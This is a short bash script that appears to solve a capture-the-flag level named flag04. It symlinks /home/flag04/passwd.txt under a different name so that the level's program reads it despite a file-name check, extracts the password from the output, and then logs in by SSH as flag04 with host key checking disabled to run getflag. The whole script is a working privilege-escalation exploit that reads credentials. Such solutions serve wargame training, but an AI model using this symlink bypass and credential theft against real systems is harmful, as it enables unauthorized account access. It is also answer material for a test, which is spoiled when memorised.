#!/usr/bin/env bash

ln -f -s /home/flag04/passwd.txt /tmp/flag04

flagpass="$(/home/flag04/flag04 /tmp/flag04 | awk '{print $NF}')"

rm -f /tmp/flag04

if [[ -n $flagpass ]]; then
    SSHPASS="$flagpass" sshpass -e -- \
        ssh -l flag04 -o StrictHostKeyChecking=no 127.0.0.1 getflag
fi
